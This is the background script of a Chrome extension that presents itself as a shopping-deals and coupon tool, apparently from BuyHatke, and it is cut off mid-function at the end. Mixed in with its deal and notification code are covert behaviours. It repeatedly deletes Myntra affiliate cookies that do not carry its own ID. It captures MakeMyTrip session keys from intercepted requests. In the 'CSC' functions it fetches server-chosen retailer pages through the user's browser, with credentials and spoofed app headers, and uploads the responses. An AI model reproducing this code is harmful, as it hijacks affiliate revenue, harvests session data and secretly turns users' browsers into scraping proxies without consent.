resultsTable = [];
hashTable = [];
watchListArray = [];
offersArray = [];
pushArray = [];
cscArray = [];
storeNotarr = [];
jsonStoreNot = "";
enterHere = 0;
pushShown = {};
lastScores = "0/0";
lastOvers = "0.0";
scoreMacBadge = 0;
currentPosShown = -1;
teamBatting = "";
lastShown = 0;
matchesActive = 1;
matchSelected = "";
// localStorage.subsMatches = 18129;
lastFetched = 0;
anyMatch = "";
var hashPushName = {};
var hashPushLink = {};
// notIDArray = [];
temp1 = [];
temp2 = [];
http = new Array();
inUSE = new Array();
saleArray = [];
hasGiven = 0;
reqSent = 0;
for(i=0;i<100;i++){
  http[i] = new XMLHttpRequest();
  inUSE[i] = 0;
}
function getXMLHTTPRequest() {

  req = new XMLHttpRequest();
  return req;

}

function getCookies(domain, name, callback) {
    chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
        if(callback && cookie) {
            callback(cookie.value);
        }
    });
}

//usage:
function checkAll(){
  // console.log("I am called");
  var cook1 = "utm" + "_" + "track" + "_" + "1";
  getCookies("http://www.myntra.com", cook1, function(id) {
      if(id){
      if(id.split("370202").length>1){

     }
     else {
       chrome.cookies.remove({"url": "http://www.myntra.com", "name": "utm" + "_" + "track" + "_" + "1"}, function(cookie) {
          // console.log(cookie);
      });
       // console.log("Ditching it 1");
     }
     }
  });

  var cook1 = "utm" + "_" + "track" + "_" + "start";
  getCookies("http://www.myntra.com", cook1, function(id) {
     if(id){
      if(id.split("370202").length>1){

     }
     else {
       chrome.cookies.remove({"url": "http://www.myntra.com", "name": "utm" + "_" + "track" + "_" + "start"}, function(cookie) {
      });
       // console.log("Ditching it 2");
     }
    }
  });
}

setInterval(function(){checkAll();}, 5000);

function createdCheck(){
  chrome.tabs.getAllInWindow(null, function(tabs){
      for (var i = 0; i < tabs.length; i++) {
        // console.log(tabs[i].url);
        if(tabs[i].url.split("myntra").length > 1){
            checkAll();
        }
      }
  });
}

chrome.tabs.onCreated.addListener(function(data){
    createdCheck();
});

chrome.webRequest.onBeforeRequest.addListener(onBeforeSendHeaders,
 { urls: ["https://cheapfaresindia.makemytrip.com/international/bestCoupons"] },
 [ "requestBody" ]
 );
var SessionKeyMMTInt = "";
function onBeforeSendHeaders(details) {
  rawraw = details;
  var arrayBuffer = details.requestBody.raw[0].bytes;
  var binaryString = '', bytes = new Uint8Array(arrayBuffer), length = bytes.length;
  for (var i = 0; i < length; i++) {
    binaryString += String.fromCharCode(bytes[i]);
  }
  if(binaryString.trim() != ""){
    binaryString = JSON.parse(binaryString);
    SessionKeyMMTInt = binaryString.sessionKey;
  }
}

var manifest_det = chrome.runtime.getManifest();
var manifest_version = manifest_det.version;

if(localStorage.version!=manifest_version){
  sendAnalyticsData("updated-version-" + manifest_version);
  localStorage.version = manifest_version;
}

function sendAnalyticsData(parametersRec){
  if(parametersRec.length > 1000){
   return;
 }
 var httpq4 = new getXMLHTTPRequest();
 if(parametersRec.split("~*").length > 1){
  parametersRec = parametersRec.split("~*");
  otherData = parametersRec[1];
  parametersRec = parametersRec[0];
}
else {
  otherData = localStorage.ext_id;
}
var myurl = "https://tracking.buyhatke.com/analytics/?cid=" + localStorage.ext_id + "&uid=" + localStorage.ext_id + "&cs=" + encodeURIComponent(otherData) + "&tid=UA-21447924-6" + "&dp=" + parametersRec + "&cm=apnese";
if(myurl.length > 4000){
 return;
}
var parameters = "";
httpq4.open("POST", myurl, true);
httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
httpq4.onreadystatechange = function(){
  if (httpq4.readyState == 4) {
    if(httpq4.status == 200) {
    }
  }
};
httpq4.send(parameters);
}



function sendData2(compData, sender_id){
  // console.log("I was called");
  var comp = compData.split("~*");
  var jsonData = comp[0];
  var cur_pos = comp[1];
  var fileName = comp[2];
  var jsonData = JSON.parse(jsonData);
  var httpq4 = new getXMLHTTPRequest();
  var ext_id, ext_auth;
  // console.log(jsonData);
  ext_id = localStorage.ext_id;
  ext_auth = localStorage.ext_auth;
  var myurl = "http://coup1.buyhatke.com/requestHandler/" + fileName;
  var jsonParData = (jsonData);
  var parameters = "ext_id=" + ext_id + "&auth_val=" + ext_auth + "&webID=" + cur_pos;
  var L = jsonParData.length;
  for (var i = 0; i < L; i++) {
    var obj = jsonParData[i];
    for (var j in obj) {
      var paramKey = (j);
      var paramVal = (jsonParData[i][j]);
      parameters += "&" + paramKey + "=" + paramVal;
    }
  }
  // console.log(parameters);
  // console.log(myurl);
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
       mytext = httpq4.responseText;
       chrome.tabs.sendMessage(sender_id, {dataBack: fileName + "~*~file_" + mytext  });
     }
   }
 }
 httpq4.send(parameters);
}

function getCoupons(pos, tabId){
  var mytext = "";
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://coupons.buyhatke.com/PickCoupon/FreshCoupon/getCoupons.php";
  var myurl = "https://compare.buyhatke.com/extension/getCoupons.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&pos=" + pos;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
       mytext = httpq4.responseText;
       // console.log(mytext);
       chrome.tabs.sendMessage(tabId, {coupons: mytext});
     }
   }
 };
 httpq4.send(parameters);
}

function getDeals(pid, tabId){
  var mytext = "";
  var httpq4 = new getXMLHTTPRequest();
  pidEx = pid.split("~*~*");
  pid = pidEx[0];
  switch(pidEx[1]){
    case "0":
    var myurl = "https://compare.buyhatke.com/dealsAPI/pidToList.php";
    break;
    case "1":
    var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListAmaz.php";
    break;
    case "2":
    var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListSnap.php";
    break;
    case "3":
    var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListMyn.php";
    break;
    case "4":
    var myurl = "https://compare.buyhatke.com/dealsAPI/pidToListJab.php";
    break;
    default:
    var myurl = "https://compare.buyhatke.com/dealsAPI/pidToList.php";
    break;
  }
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&pid=" + pid;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
       mytext = httpq4.responseText;
      //console.log(mytext);
      chrome.tabs.sendMessage(tabId, {deals: mytext});
    }
  }
};
httpq4.send(parameters);
}

function monitorSaleTime(){
  //console.log("monitorSaleTime was called");
  var pollInterval = 1000 * 10;
  window.setTimeout(monitorSaleTime, pollInterval);
  var saleTest = localStorage.saleArray;
  var flag = 0;
  if(saleTest!=""){
    var saleTest2 = JSON.parse(saleTest);
    for(var k=0; k< saleTest2.length; k++){
      var curTime = Math.round(+new Date()) + Math.round(localStorage.diffTime);
      var saleTime = Math.round(saleTest2[k].startsAt)*1000;
      console.log("value1 " + (saleTime - curTime) + " value2 " + (curTime - saleTime));
      if(saleTime - curTime < 3600000 && curTime - saleTime < 7200000 ){
        localStorage.saleMonitor = 1;
        console.log("Monitor value is " + localStorage.saleMonitor);
        flag = 1;
      }
    }
  }
  else {
    localStorage.saleMonitor = 0;
    console.log("Monitor value is " + localStorage.saleMonitor);
  }
  if(flag == 0){
    localStorage.saleMonitor = 0;
    console.log("Monitor value is " + localStorage.saleMonitor);
  }
}


// This event is fired with the user accepts the input in the omnibox.
chrome.omnibox.onInputEntered.addListener(
  function(text) {
    console.log('inputEntered: ' + text);
    var queryTry = text.split(" ").join("-");
    var url = "https://compare.buyhatke.com/products/" + queryTry;
    window.open(url);
  });



function setCookie(c_name,value,exdays)
{
  var exdate=new Date();
  exdate.setDate(exdate.getDate() + exdays);
  var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
  document.cookie=c_name + "=" + c_value;
}

function sendSubscribed(){
  var pollInterval = 1000 * 15;
  window.setTimeout(sendSubscribed, pollInterval);
  if(localStorage.email_sent==0 && localStorage.email_lucky!=""){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "http://node4.buyhatke.com/extension/sendSubscribed.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&subs=" + localStorage.subscribedFor + "&id=" + localStorage.email_lucky;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          localStorage.email_sent = 1;
        }
      }
    };
    httpq4.send(parameters);
  }
}


function cscInit(){
  var pollInterval = 1000 * 3600;
  window.setTimeout(cscInit, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://buyhatke.com/CSC/reqHandler.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
        console.log("mytextCSC: "+ mytext);
        if(mytext.trim() !=""){
          // console.log("CSC HERE IT IS");

          cscArray = JSON.parse(mytext);
          console.log("cscArray: "+cscArray);
          var id_per = cscArray[0]['id_per'];
          var urlCSC = cscArray[0]['url'];
          var otkCSC = cscArray[0]['otk'];
          var instructCSC = cscArray[0]['instruct'];
          var siteCheck = urlCSC;
          if(siteCheck.split("?").length > 1){
            siteCheck = siteCheck.split("?");
            siteCheck = siteCheck[0];
          }
          if(siteCheck.split("&").length > 1){
            siteCheck = siteCheck.split("&");
            siteCheck = siteCheck[0];
          }
          if(siteCheck.split("#").length > 1){
            siteCheck = siteCheck.split("#");
            siteCheck = siteCheck[0];
          }

          if( siteCheck.split("flipkart.com").length > 1 || siteCheck.split("flipkart.net").length > 1 || siteCheck.split("snapdeal.com").length > 1 || siteCheck.split("shoppersstop.com").length > 1 || siteCheck.split("pepperfry.com").length > 1 ){
            //allow these white-listed domains ONLY
            if(instructCSC == ""){
              sendCSCResp(id_per, urlCSC, otkCSC, instructCSC);
            }
            else{
              instructPos = JSON.parse(instructCSC);
              if(instructPos.pos == 2){
                sendCSCFlip(id_per, urlCSC, otkCSC, instructCSC);
              }
              else{
                sendCSCResp(id_per, urlCSC, otkCSC, instructCSC);
              }
            }
          } //sites allowed ends
          else{
            // reject all other domains
          }

        }
      }
    }
  };
  httpq4.send(parameters);
}

function sendCSCResp(id_per, urlCSC, otkCSC, instructCSC){
  var httpq4 = new getXMLHTTPRequest();
  httpq4.open("GET", urlCSC, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
        var httpq5 = new getXMLHTTPRequest();
        var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&url=" + encodeURIComponent(urlCSC) + "&otk=" + otkCSC + "&resp=" + encodeURIComponent(mytext) + "&id_per=" + id_per + "&instruct=" + instructCSC;
        var myURL = "http://buyhatke.com/CSC/dataProcessor.php";
        httpq5.open("POST", myURL, true);
        httpq5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        httpq5.onreadystatechange = function(){
          if (httpq5.readyState == 4) {
            if(httpq5.status == 200) {
              // var mytext = httpq5.responseText;

            }
          }
        };
        httpq5.send(parameters);
      }
      else if(httpq4.status == 404) {
        var mytext = httpq4.responseText;

        var httpq5 = new getXMLHTTPRequest();
        var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&url=" + encodeURIComponent(urlCSC) + "&otk=" + otkCSC + "&resp=" + encodeURIComponent(mytext) + "&id_per=" + id_per + "&instruct=" + instructCSC;
        var myURL = "http://buyhatke.com/CSC/dataProcessor.php";
        httpq5.open("POST", myURL, true);
        httpq5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        httpq5.onreadystatechange = function(){
          if (httpq5.readyState == 4) {
            if(httpq5.status == 200) {
              // var mytext = httpq5.responseText;

            }
          }
        };
        httpq5.send(parameters);
      }
    }
  };
  httpq4.send();
}

function sendCSCFlip(id_per, urlCSC, otkCSC, instructCSC){

  var instructCSCFlip = JSON.parse(instructCSC);
  var pid_rec  = instructCSCFlip.pid;
  var token_rec = instructCSCFlip.sToken;
  var data = null;

  var xhr = new XMLHttpRequest();
  xhr.withCredentials = true;

  xhr.addEventListener("readystatechange", function () {
    if (this.readyState === this.DONE) {
      console.log(this.responseText);
    }
  });

  xhr.open("GET", "http://mobileapi.flipkart.net/2/discover/productInfo/0?pids="+ pid_rec +"&lids=LSTBDSE5GMYYAHQXEYWJU6FYT%2CLSTBDSE5GMY4YMKR27PY3NF7E&disableMultipleImage=true");
  xhr.setRequestHeader("device-id", "7d736faa7182e3c8c8e3baf0369886fb");
  xhr.setRequestHeader("x-user-agent", "Mozilla/5.0 (Linux; Android 5.0.1; HTC One_M8 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36 FKUA/Retail/620400/Android/Mobile (HTC/HTC One_M8/7d736faa7182e3c8c8e3baf0369886fb) sn 2.VI3E2E9475A63846F2B8747D5D38C74BC1.SI8B5216D662394E2BA362290EB3C484BF.VS144087821326454243812.1445263508");
  xhr.setRequestHeader("securetoken", token_rec);
  xhr.setRequestHeader("cache-control", "no-cache");
  xhr.setRequestHeader("postman-token", "926f6a17-082b-61aa-754b-03180495b6e0");

  xhr.send(data);
  xhr.onreadystatechange = function(){
    if (xhr.readyState == 4) {
      if(xhr.status == 200) {
        var mytext = xhr.responseText;

        var httpq5 = new getXMLHTTPRequest();
        var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&url=" + encodeURIComponent(urlCSC) + "&otk=" + otkCSC + "&resp=" + encodeURIComponent(mytext) + "&id_per=" + id_per + "&instruct=" + instructCSC;
        var myURL = "http://buyhatke.com/CSC/dataProcessor.php";
        httpq5.open("POST", myURL, true);
        httpq5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        httpq5.onreadystatechange = function(){
          if (httpq5.readyState == 4) {
            if(httpq5.status == 200) {
              // var mytext = httpq5.responseText;

            }
          }
        };
        httpq5.send(parameters);
      }
    }
  }

}

if(localStorage.isShownWinner == undefined || localStorage.isShownWinner == ""){
  localStorage.isShownWinner = 0;
}


function checkWinnerStatus(){
  if(localStorage.isShownWinner==0){
  var pollInterval = 1000 * 20000;
  window.setTimeout(checkStatus, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/autocoupon-contest/checkWinnerStatus.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      // console.log(mytext);
      if(mytext.trim()==1){
         notifyPAImage("https://s3-ap-southeast-1.amazonaws.com/push-images/autocoupons-winner-notify.png", "🎉You are the lucky winner🎉", "Yippeee!! Congrats! you are the winner of our Auto coupon Contest. You have won ₹600 worth of goodies. Tap here to submit your details", "https://compare.buyhatke.com/autocoupon-contest/?utm_source=push", "pushLucky3001231992");
         localStorage.isShownWinner = 1;
      }
      //console.log(watchListArray[0]);
    }
  }
};
httpq4.send(parameters);
}
}

checkWinnerStatus();

function checkStatus(){
  var pollInterval = 1000 * 10800;
  window.setTimeout(checkStatus, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/checkStatus.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      // console.log(mytext);
      if(mytext!="" && mytext.trim() != "Authentication Failed!" && (JSON.parse(mytext).length)!=0){
        watchListArray = JSON.parse(mytext);
      }
      //console.log(watchListArray[0]);
    }
  }
};
httpq4.send(parameters);
}

function checkStatusPushDeals(){
  var pollInterval = 1000 * 1200;
  window.setTimeout(checkStatusPushDeals, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://tracking.buyhatke.com/dynamicExt/offersNew.txt?rand=" + Math.floor((Math.random() * 10000) + 1);
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("GET", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      //console.log(mytext);
      if(mytext!=""){
        pushArray = JSON.parse(mytext);
      }
      //console.log(watchListArray[0]);
    }
  }
};
httpq4.send(parameters);
}

checkStatusPushDeals();

function checkStatusURLDeals(){
  var pollInterval = 1000 * 1200;
  window.setTimeout(checkStatusURLDeals, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://tracking.buyhatke.com/dynamicExt/offers.txt?rand=" + Math.floor((Math.random() * 10000) + 1);
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("GET", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      //console.log(mytext);
      if(mytext!=""){
        offersArray = JSON.parse(mytext);
      }
      //console.log(watchListArray[0]);
    }
  }
};
httpq4.send(parameters);
}

checkStatusURLDeals();

function callWishList(flag){
  // console.log("callWishList was called");
  if(flag == 1){
    var pollInterval = 1000 * 3600 * 24;
    window.setTimeout( function(){callWishList(1);}, pollInterval);
  }
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/wishlist3/api/fetchWLData.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
      //console.log(mytext);
      if(mytext!=""){
        localStorage.mywishlist = mytext;
        // console.log("localStorage.mywishlist changed to ", localStorage.mywishlist);
      }
      //console.log(watchListArray[0]);
    }
  }
};
httpq4.send(parameters);
}

callWishList(1);

var countYet = 0;
function checkStatus3(){
  countYet++;
  if(countYet < 3){
    var pollInterval = 1000 * 30;
  }
  else {
    var pollInterval = 1000 * 4800;
  }
  window.setTimeout(checkStatus3, pollInterval);
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "https://compare.buyhatke.com/extension/checkStatus5.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
  httpq4.open("POST", myurl, true);
  httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  httpq4.onreadystatechange = function(){
    if (httpq4.readyState == 4) {
      if(httpq4.status == 200) {
        var mytext = httpq4.responseText;
        // console.log(mytext);
        if(mytext!="" && mytext.trim() != "Authentication Failed!" && (JSON.parse(mytext).length)!=0){
          // watchListArray = JSON.parse(mytext);
        }
      //console.log(watchListArray[0]);
    }
  }
};
httpq4.send(parameters);
}

var linkArray = [];

function creationCallback(){

}

function notClicked(notID) {
   //console.log("The notification '" + linkArray[0].notfID + "' was clicked");
   for(i=0;i<linkArray.length;i++){
    if(linkArray[i].notfID== notID){
      window.open(linkArray[i].URL);
    }
  }
}

chrome.notifications.onClicked.addListener(notClicked);

function storeNot(image, title, detail, link, id, type){
  if(localStorage.pushNotStore != undefined && localStorage.pushNotStore != ""){
    storeNotarr = JSON.parse(localStorage.pushNotStore);
  }
  storeNotarr.push({notfID : id, URL : link, image: image, title: title, detail: detail, type: type});
  jsonStoreNot = JSON.stringify(storeNotarr);
  localStorage.pushNotStore = jsonStoreNot;
  storeNotarr = [];
  jsonStoreNot = "";
}
$('.hk-btn-link').click(function(){
  localStorage.pushNotStore = "";
});
function notifyPAImage(image, title, detail, link, pushAttr) {
  if(image==""){
    image = chrome.extension.getURL("logo_128x128.png");
  }
  if(pushAttr=="cricketAlertPush" || pushAttr=="cricketAlertPush2"){
      var opt = {
      type: "basic",
      title: title,
      message: detail,
      iconUrl: image,
      priority : 100,
      requireInteraction : false
    }
  }
  else {
  var opt = {
    type: "basic",
    title: title,
    message: detail,
    iconUrl: image,
    priority : 100,
    requireInteraction : true
  }
}
  var linkPass = link;
  var curID = getNotificationId();
  hashPushName[curID] = pushAttr;
  chrome.notifications.create(curID, opt, function(id){
    console.log("notification showed !" + id);
    linkArray.push({notfID : id, URL : link});
  });
}

function notify(title, detail, link, pushAttr) {
  var timePref = localStorage.promoPushArray;
  var d = new Date();
  var hours = d.getHours();
  timePref = JSON.parse(timePref);
  if(timePref[0].value==0){
    console.log("Returning - Promo push Disabled ");
    return;
  }
  if(timePref[1].value==0 && timePref[2].value==0){
    console.log("Returning - Promo push Disabled 2");
    return;
  }
  var flag = 0;
  if(timePref[1].value==1 && timePref[2].value==1){
    // all ok ;)
  }
  else if(timePref[1].value==1){
    if(hours >=10 && hours < 21){

    }
    else {
      setTimeout(function(){ notify(title, detail, link, pushAttr); }, 1800000);
      console.log("Returning - Promo push Disabled 3");
      return;
    }
  }
  else if(timePref[1].value==1){
    if(hours < 10 || hours >= 21){

    }
    else {
      setTimeout(function(){ notify(title, detail, link, pushAttr); }, 1800000);
      console.log("Returning - Promo push Disabled 4");
      return;
    }
  }
  var opt = {
    type: "basic",
    title: title,
    message: detail,
    iconUrl: chrome.extension.getURL("logo_128x128.png"),
    priority : 100,
    requireInteraction : true
  }
  var linkPass = link;
  var curID = getNotificationId();
  hashPushName[curID] = pushAttr;
  chrome.notifications.create(curID, opt, function(id){
    console.log("notification showed !" + id);
    linkArray.push({notfID : id, URL : link});
  });
}

function notifyIcon(icon, title, detail, link, pushAttr, titleButton) {
  var timePref = localStorage.promoPushArray;
  timePref = JSON.parse(timePref);
  if(titleButton==""){
    titleButton = "Claim Offer";
  }
  else {
   if(timePref[3].value==0){
    console.log("No latest offer push nw");
    return;
  }
}
var d = new Date();
var hours = d.getHours();
console.log("d " + d + " hours " + hours);
console.log(timePref);
hours = Math.floor(hours);


console.log(timePref[0].value + " " + timePref[1].value + " " + timePref[2].value);
if(timePref[0].value==0){
  console.log("Returning - Promo push Disabled ");
  return;
}
if(timePref[1].value==0 && timePref[2].value==0){
  console.log("Returning - Promo push Disabled 2");
  return;
}
var flag = 0;
if(timePref[1].value==1 && timePref[2].value==1){
    // all ok ;)
  }
  else if(timePref[1].value==1){
    if(hours >=10 && hours < 21){

    }
    else {
      if(titleButton=="Check Updated Offers"){
        setTimeout(function(){ notifyIcon(icon, title, detail, link, pushAttr, titleButton); }, 1800000);
      }
      console.log("Returning - Promo push Disabled 3");
      return;
    }
  }
  else if(timePref[2].value==1){
    if(hours < 10 || hours >= 21){

    }
    else {
      if(titleButton=="Check Updated Offers"){
        setTimeout(function(){ notifyIcon(icon, title, detail, link, pushAttr, titleButton); }, 1800000);
      }
      console.log("Returning - Promo push Disabled 4");
      return;
    }
  }
  var opt = {
    type: "basic",
    title: title,
    message: detail,
    buttons: [
    { title: titleButton },
    { title: 'Push Settings' }
    ],
    iconUrl: icon,
    priority : 100,
    requireInteraction : true
  }
  var linkPass = link;
  var curID = getNotificationId();
  hashPushName[curID] = pushAttr;
  hashPushLink[curID] = link;
  chrome.notifications.create(curID, opt, function(id){
    console.log("notification showed here !" + id);
    linkArray.push({notfID : id, URL : link});
  });
}

function notifyImage(image, title, detail, link, pushAttr) {
  var timePref = localStorage.promoPushArray;
  var d = new Date();
  var hours = d.getHours();
  timePref = JSON.parse(timePref);
  if(timePref[0].value==0){
    console.log("Returning - Promo push Disabled ");
    return;
  }
  if(timePref[1].value==0 && timePref[2].value==0){
    console.log("Returning - Promo push Disabled 2");
    return;
  }
  var flag = 0;
  if(timePref[1].value==1 && timePref[2].value==1){
    // all ok ;)
  }
  else if(timePref[1].value==1){
    if(hours >=10 && hours < 21){

    }
    else {
      setTimeout(function(){ notifyImage(image, title, detail, link, pushAttr); }, 1800000);
      console.log("Returning - Promo push Disabled 3");
      return;
    }
  }
  else if(timePref[1].value==1){
    if(hours < 10 || hours >= 21){

    }
    else {
      setTimeout(function(){ notifyImage(image, title, detail, link, pushAttr); }, 1800000);
      console.log("Returning - Promo push Disabled 4");
      return;
    }
  }
  var opt = {
    type: "image",
    title: title,
    imageUrl: image,
    message: detail,
    iconUrl: chrome.extension.getURL("logo_128x128.png"),
    priority : 100
  }
  var linkPass = link;
  var curID = getNotificationId();
  hashPushName[curID] = pushAttr;
  chrome.notifications.create(curID, opt, function(id){
    console.log("notification showed !" + id);
    linkArray.push({notfID : id, URL : link});
  });
}

// notifyImage("https://s-media-cache-ak0.pinimg.com/originals/0d/28/57/0d28577e3afbfbad7a109308879b00c6.gif", "Test Push ", "Lets see how it looks !", "http://buyh.tk/3");

// It starts here

var pendingNotifications = {};

/* For demonstration purposes, the notification creation
 * is attached to the browser-action's `onClicked` event.
 * Change according to your needs. */
 function newNot(){
  var dateStr = new Date().toUTCString();
  var details = {
    type:    "basic",
    iconUrl: chrome.extension.getURL("logo_128x128.png"),
    title:   "REMINDER",
    message: dateStr + "\n\n"
    + "There is one very important matter to attend to !\n"
    + "Deal with it now ?",
    contextMessage: "Very important stuff...",
    buttons: [
    { title: "Yes" },
    { title: "No"  }
    ]
  };
  var listeners = {
    onButtonClicked: function(btnIdx) {
      if (btnIdx === 0) {
        console.log(dateStr + ' - Clicked: "yes"');
      } else if (btnIdx === 1) {
        console.log(dateStr + ' - Clicked: "no"');
      }
    },
    onClicked: function() {
      console.log(dateStr + ' - Clicked: "message-body"');
    },
    onClosed: function(byUser) {
      console.log(dateStr + ' - Closed: '
        + (byUser ? 'by user' : 'automagically (!?)'));
    }
  };

  /* Create the notification */
  createNotification(details, listeners);
}

//newNot();

/* Create a notification and store references
* of its "re-spawn" timer and event-listeners */
function createNotification(details, listeners, notifId) {
  (notifId !== undefined) || (notifId = "");
  notifId = getNotificationId();
  chrome.notifications.create(notifId, details, function(id) {
    console.log('Created notification "' + id + '" !');
    if (pendingNotifications[id] !== undefined) {
      clearTimeout(pendingNotifications[id].timer);
    }

    pendingNotifications[id] = {
      listeners: listeners,
      timer: setTimeout(function() {
        console.log('Re-spawning notification "' + id + '"...');
        destroyNotification(id, function(wasCleared) {
          if (wasCleared) {
            createNotification(details, listeners, id);
          }
        });
      }, 5000)
    };
  });
}

/* Completely remove a notification, cancelling its "re-spawn" timer (if any)
* Optionally, supply it with a callback to execute upon successful removal */
function destroyNotification(notifId, callback) {

  /* Cancel the "re-spawn" timer (if any) */
  if (pendingNotifications[notifId] !== undefined) {
    clearTimeout(pendingNotifications[notifId].timer);
    delete(pendingNotifications[notifId]);
  }

  /* Remove the notification itself */
  chrome.notifications.clear(notifId, function(wasCleared) {
    console.log('Destroyed notification "' + notifId + '" !');

    /* Execute the callback (if any) */
    callback && callback(wasCleared);
  });
}

/* Respond to the user's clicking one of the buttons */
chrome.notifications.onButtonClicked.addListener(function(notifId, btnIdx) {
  if (pendingNotifications[notifId] !== undefined) {
    var handler = pendingNotifications[notifId].listeners.onButtonClicked;
    destroyNotification(notifId, handler(btnIdx));
  }
});

/* Respond to the user's clicking on the notification message-body */
chrome.notifications.onClicked.addListener(function(notifId) {
  if (pendingNotifications[notifId] !== undefined) {
    var handler = pendingNotifications[notifId].listeners.onClicked;
    destroyNotification(notifId, handler());
  }
});

/* Respond to the user's clicking on the small 'x' in the top right corner */
chrome.notifications.onClosed.addListener(function(notifId, byUser) {
  if (pendingNotifications[notifId] !== undefined) {
    var handler = pendingNotifications[notifId].listeners.onClosed;
    destroyNotification(notifId, handler(byUser));
  }
});

// It ends here


function checkEmailVerified(){
  if(localStorage.ext_email==""){
    var pollInterval = 1000 * 3600 * 5;
  }
  else {
    var pollInterval = 1000 * 3600 * 5;
  }
  window.setTimeout(checkEmailVerified, pollInterval);
  if(localStorage.saleMonitor == 0){
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "https://compare.buyhatke.com/extension/checkEmailVerified.php";
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
    httpq4.open("POST", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          var mytext = httpq4.responseText;
          localStorage.ext_email = mytext;
        }
      }
    };
    httpq4.send(parameters);
  }
  else {
    console.log("Postponed checkEmailVerified due to Redmi Sale");
  }
}


function sendData(url, data){
  var httpq4 = new getXMLHTTPRequest();
  var myurl = "http://buyhatke.com/compare/extension/pushWebData.php";
  var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&data=" + data + "&url=" + encodeURIComponent(url);
  httpq4.open("POST", myurl, true);
